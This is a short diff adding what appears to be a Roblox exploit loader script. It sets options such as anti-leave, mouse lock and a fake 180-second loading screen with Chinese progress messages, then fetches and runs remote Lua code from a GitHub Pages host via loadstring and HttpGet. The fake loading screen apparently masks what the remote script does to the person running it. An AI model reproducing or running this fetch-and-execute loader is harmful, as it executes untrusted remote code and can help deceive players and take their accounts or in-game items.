@@ -1,0 +1,21 @@
+_G.UserID = cocvn_my
+
+_G.LoadingScreen = false
+
+_G.AntiLeave = false
+
+_G.MouseLock = false
+
+-- set them to false if you don't want them
+
+_G.ScriptName = "脚本加载（有可能会闪退）"
+
+_G.FirstText = "脚本准备"
+
+_G.SecondText = "脚本加载..."
+
+_G.ThirdText = "快完成了..."
+
+_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://rizz69.github.io/Script.lua", true))()
